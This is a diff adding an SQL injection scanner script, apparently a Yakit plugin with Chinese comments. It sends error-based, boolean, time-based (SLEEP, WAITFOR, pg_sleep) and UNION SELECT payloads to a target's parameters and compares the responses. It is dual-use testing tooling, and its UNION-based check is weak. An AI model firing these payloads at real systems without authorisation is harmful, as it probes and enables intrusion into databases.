@@ -1,0 +1,457 @@
+# SQL注入检测插件 - 综合检测模块
+# 支持：错误型、布尔型、时间型、联合查询型SQL注入检测
+
+# 基础配置
+SQLI_CONFIG = {
+    "timeout": 10,
+    "delayTime": 5,
+    "concurrent": 10,
+    "maxDepth": 3,
+}
+
+# SQL错误特征库
+SQL_ERRORS = {
+    "mysql": [
+        "SQL syntax.*MySQL",
+        "Warning.*mysql_",
+        "MySqlException",
+        "MySQLSyntaxErrorException",
+        "com.mysql.jdbc",
+        "Zend_Db_Adapter_Mysqli",
+        "MySQL server version",
+    ],
+    "mssql": [
+        "Microsoft SQL Server.*Error",
+        "ODBC SQL Server Driver",
+        "SQLServer JDBC Driver",
+        "com.microsoft.sqlserver",
+        "SqlException",
+        "SQLServerException",
+    ],
+    "oracle": [
+        "Oracle.*Error",
+        "OracleException",
+        "ORA-[0-9]{4,5}",
+        "java.sql.SQLException",
+        "OracleDriver",
+    ],
+    "postgresql": [
+        "PostgreSQL.*Error",
+        "PG::Error",
+        "psycopg2",
+        "org.postgresql.util.PSQLException",
+    ],
+    "sqlite": [
+        "SQLite/JDBCDriver",
+        "SQLite.Exception",
+        "System.Data.SQLite",
+        "sqlite3.OperationalError",
+    ],
+    "access": [
+        "Microsoft Access Driver",
+        "JET Database Engine",
+        "Access Database Engine",
+    ],
+}
+
+# SQL注入Payload库
+SQLI_PAYLOADS = {
+    "error": [
+        "'",
+        "''",
+        "`",
+        "\\\"",
+        "')",
+        "'))",
+        "`'`",
+        "1'",
+        "1''",
+        "1 AND 1=1",
+        "1 AND 1=2",
+        "1 OR 1=1",
+        "1' AND '1'='1",
+        "1' AND '1'='2",
+        "1' OR '1'='1",
+        "1\" AND \"1\"=\"1",
+        "1\" AND \"1\"=\"2",
+    ],
+    "boolean": [
+        " AND 1=1",
+        " AND 1=2",
+        " OR 1=1",
+        " OR 1=2",
+        "' AND '1'='1",
+        "' AND '1'='2",
+        "' OR '1'='1",
+        "' OR '1'='2",
+        "\" AND \"1\"=\"1",
+        "\" AND \"1\"=\"2",
+        "\" OR \"1\"=\"1",
+        "\" OR \"1\"=\"2",
+    ],
+    "time": [
+        " AND SLEEP(%d)",
+        " OR SLEEP(%d)",
+        "' AND SLEEP(%d)--",
+        "' OR SLEEP(%d)--",
+        "\" AND SLEEP(%d)--",
+        "\" OR SLEEP(%d)--",
+        "; WAITFOR DELAY '0:0:%d'--",
+        "'; WAITFOR DELAY '0:0:%d'--",
+        " AND pg_sleep(%d)",
+        "' AND pg_sleep(%d)--",
+        " OR pg_sleep(%d)",
+        "' OR pg_sleep(%d)--",
+        " AND (SELECT * FROM (SELECT(SLEEP(%d)))a)",
+        "' AND (SELECT * FROM (SELECT(SLEEP(%d)))a)--",
+    ],
+    "union": [
+        " UNION SELECT NULL--",
+        " UNION SELECT NULL,NULL--",
+        " UNION SELECT NULL,NULL,NULL--",
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "\" UNION SELECT NULL--",
+        "\" UNION SELECT NULL,NULL--",
+        " UNION ALL SELECT NULL--",
+        " UNION ALL SELECT NULL,NULL--",
+    ],
+}
+
+# 检查SQL错误特征
+func checkSqlErrors(response) {
+    body = string(response.Body)
+    headers = response.Headers
+    
+    for dbType, patterns := range SQL_ERRORS {
+        for _, pattern := range patterns {
+            if re.Match(pattern, body) || re.Match(pattern, headers) {
+                return dbType, pattern
+            }
+        }
+    }
+    return "", ""
+}
+
+# 错误型SQL注入检测
+func checkErrorBasedInjection(target, param, method, payload) {
+    originalReq = getOriginalRequest(target, param, method)
+    originalResp, err = poc.HTTP(originalReq, poc.https(true))
+    if err != nil {
+        return false, nil
+    }
+    
+    # 发送带payload的请求
+    injectReq = buildRequest(target, param, method, payload)
+    injectResp, err = poc.HTTP(injectReq, poc.https(true))
+    if err != nil {
+        return false, nil
+    }
+    
+    # 检查是否出现SQL错误
+    dbType, pattern := checkSqlErrors(injectResp)
+    if dbType != "" {
+        return true, {
+            "type": "Error-based SQL Injection",
+            "dbType": dbType,
+            "pattern": pattern,
+            "payload": payload,
+            "param": param,
+            "evidence": pattern,
+        }
+    }
+    return false, nil
+}
+
+# 布尔型SQL注入检测
+func checkBooleanBasedInjection(target, param, method) {
+    payloads := SQLI_PAYLOADS["boolean"]
+    
+    # 获取原始响应作为基准
+    originalReq = getOriginalRequest(target, param, method)
+    originalResp, err = poc.HTTP(originalReq, poc.https(true))
+    if err != nil {
+        return false, nil
+    }
+    originalBody = string(originalResp.Body)
+    originalLength = len(originalBody)
+    
+    # 成对检测True/False条件
+    for i := 0; i < len(payloads); i += 2 {
+        truePayload = payloads[i]
+        falsePayload = payloads[i+1]
+        
+        # 发送True条件请求
+        trueReq = buildRequest(target, param, method, truePayload)
+        trueResp, err1 := poc.HTTP(trueReq, poc.https(true))
+        if err1 != nil {
+            continue
+        }
+        trueBody = string(trueResp.Body)
+        trueLength = len(trueBody)
+        
+        # 发送False条件请求
+        falseReq = buildRequest(target, param, method, falsePayload)
+        falseResp, err2 := poc.HTTP(falseReq, poc.https(true))
+        if err2 != nil {
+            continue
+        }
+        falseBody = string(falseResp.Body)
+        falseLength = len(falseBody)
+        
+        # 比较响应差异
+        # True条件应该与原始响应相似，False条件应该不同
+        trueDiff = calculateDifference(originalBody, trueBody)
+        falseDiff = calculateDifference(originalBody, falseBody)
+        
+        # 如果True和False有明显差异，可能存在布尔注入
+        if trueDiff < 10 && falseDiff > 30 {
+            return true, {
+                "type": "Boolean-based SQL Injection",
+                "truePayload": truePayload,
+                "falsePayload": falsePayload,
+                "param": param,
+                "evidence": "Response length difference detected",
+            }
+        }
+    }
+    return false, nil
+}
+
+# 时间型SQL注入检测
+func checkTimeBasedInjection(target, param, method) {
+    delayTime = SQLI_CONFIG["delayTime"]
+    payloads := SQLI_PAYLOADS["time"]
+    
+    for _, payloadTemplate := range payloads {
+        payload = sprintf(payloadTemplate, delayTime)
+        
+        # 记录开始时间
+        startTime = time.Now()
+        
+        # 发送带延迟payload的请求
+        injectReq = buildRequest(target, param, method, payload)
+        injectResp, err = poc.HTTP(injectReq, 
+            poc.https(true),
+            poc.timeout(delayTime + 5),
+        )
+        
+        # 计算响应时间
+        elapsed = time.Since(startTime).Seconds()
+        
+        # 如果响应时间接近延迟时间，可能存在时间注入
+        if err == nil && elapsed >= float64(delayTime) {
+            # 二次验证，发送正常请求确认
+            normalReq = getOriginalRequest(target, param, method)
+            normalStart = time.Now()
+            poc.HTTP(normalReq, poc.https(true))
+            normalElapsed = time.Since(normalStart).Seconds()
+            
+            # 如果正常请求响应快，而注入请求响应慢，确认存在注入
+            if normalElapsed < float64(delayTime)/2 {
+                return true, {
+                    "type": "Time-based SQL Injection",
+                    "payload": payload,
+                    "param": param,
+                    "delayTime": elapsed,
+                    "evidence": sprintf("Response delayed by %.2f seconds", elapsed),
+                }
+            }
+        }
+    }
+    return false, nil
+}
+
+# 联合查询型SQL注入检测
+func checkUnionBasedInjection(target, param, method) {
+    payloads := SQLI_PAYLOADS["union"]
+    
+    # 获取原始响应
+    originalReq = getOriginalRequest(target, param, method)
+    originalResp, err = poc.HTTP(originalReq, poc.https(true))
+    if err != nil {
+        return false, nil
+    }
+    originalBody = string(originalResp.Body)
+    
+    for _, payload := range payloads {
+        injectReq = buildRequest(target, param, method, payload)
+        injectResp, err = poc.HTTP(injectReq, poc.https(true))
+        if err != nil {
+            continue
+        }
+        injectBody = string(injectResp.Body)
+        
+        # 检查响应中是否包含UNION特征
+        if re.Match("(?i)union.*select", injectBody) || 
+           re.Match("(?i)column.*count", injectBody) {
+            # 检查响应是否与原始响应不同
+            if calculateDifference(originalBody, injectBody) > 20 {
+                return true, {
+                    "type": "Union-based SQL Injection",
+                    "payload": payload,
+                    "param": param,
+                    "evidence": "UNION SELECT pattern detected in response",
+                }
+            }
+        }
+    }
+    return false, nil
+}
+
+# 辅助函数：构建请求
+func buildRequest(target, param, method, payload) {
+    if method == "GET" {
+        # 构建GET请求
+        parsedURL = str.ParseURL(target)
+        params = parsedURL.Query
+        params.Set(param, payload)
+        parsedURL.RawQuery = params.Encode()
+        newURL = parsedURL.String()
+        
+        return poc.GenerateHTTPRequestFromUrl(newURL, "GET")
+    } else {
+        # 构建POST请求
+        return poc.GenerateHTTPRequestFromUrl(target, "POST", 
+            poc.replaceBody(sprintf("%s=%s", param, codec.EncodeUrl(payload)), false),
+        )
+    }
+}
+
+# 辅助函数：获取原始请求
+func getOriginalRequest(target, param, method) {
+    if method == "GET" {
+        return poc.GenerateHTTPRequestFromUrl(target, "GET")
+    } else {
+        return poc.GenerateHTTPRequestFromUrl(target, "POST")
+    }
+}
+
+# 辅助函数：计算字符串差异度
+func calculateDifference(str1, str2) {
+    if str1 == str2 {
+        return 0
+    }
+    
+    len1 = len(str1)
+    len2 = len(str2)
+    maxLen = len1
+    if len2 > maxLen {
+        maxLen = len2
+    }
+    
+    if maxLen == 0 {
+        return 0
+    }
+    
+    # 简单的差异计算
+    diff = 0
+    minLen = len1
+    if len2 < minLen {
+        minLen = len2
+    }
+    
+    for i := 0; i < minLen; i++ {
+        if str1[i] != str2[i] {
+            diff++
+        }
+    }
+    
+    diff += (len1 - minLen) + (len2 - minLen)
+    return int(float64(diff) / float64(maxLen) * 100)
+}
+
+# 主检测函数
+func scanSQLInjection(target, params, method) {
+    results = []
+    
+    # 检测参数类型
+    paramList = str.Split(params, ",")
+    
+    for _, param := range paramList {
+        param = str.TrimSpace(param)
+        if param == "" {
+            continue
+        }
+        
+        yakit.Info("Scanning parameter: %s", param)
+        
+        # 1. 错误型SQL注入检测
+        for _, payload := range SQLI_PAYLOADS["error"] {
+            found, result := checkErrorBasedInjection(target, param, method, payload)
+            if found {
+                yakit.Info("[+] Error-based SQL Injection found!")
+                results = append(results, result)
+                break
+            }
+        }
+        
+        # 2. 布尔型SQL注入检测
+        found, result := checkBooleanBasedInjection(target, param, method)
+        if found {
+            yakit.Info("[+] Boolean-based SQL Injection found!")
+            results = append(results, result)
+        }
+        
+        # 3. 时间型SQL注入检测
+        found, result = checkTimeBasedInjection(target, param, method)
+        if found {
+            yakit.Info("[+] Time-based SQL Injection found!")
+            results = append(results, result)
+        }
+        
+        # 4. 联合查询型SQL注入检测
+        found, result = checkUnionBasedInjection(target, param, method)
+        if found {
+            yakit.Info("[+] Union-based SQL Injection found!")
+            results = append(results, result)
+        }
+    }
+    
+    return results
+}
+
+# 生成漏洞报告
+func generateReport(results) {
+    if len(results) == 0 {
+        yakit.Info("No SQL Injection vulnerabilities found.")
+        return
+    }
+    
+    yakit.Info("=" * 60)
+    yakit.Info("SQL Injection Scan Results")
+    yakit.Info("=" * 60)
+    
+    for i, result := range results {
+        yakit.Info("\n[%d] %s", i+1, result["type"])
+        yakit.Info("    Parameter: %s", result["param"])
+        yakit.Info("    Payload: %s", result["payload"])
+        if result["dbType"] != "" {
+            yakit.Info("    Database: %s", result["dbType"])
+        }
+        yakit.Info("    Evidence: %s", result["evidence"])
+        yakit.Info("-" * 60)
+    }
+}
+
+# 主入口
+func main() {
+    # 从命令行参数获取目标
+    target = cli.String("target", cli.setRequired(true))
+    params = cli.String("params", cli.setRequired(true))
+    method = cli.String("method", cli.setDefault("GET"))
+    
+    yakit.Info("Starting SQL Injection Scan...")
+    yakit.Info("Target: %s", target)
+    yakit.Info("Parameters: %s", params)
+    yakit.Info("Method: %s", method)
+    
+    # 执行扫描
+    results = scanSQLInjection(target, params, method)
+    
+    # 生成报告
+    generateReport(results)
+}
+
+main()
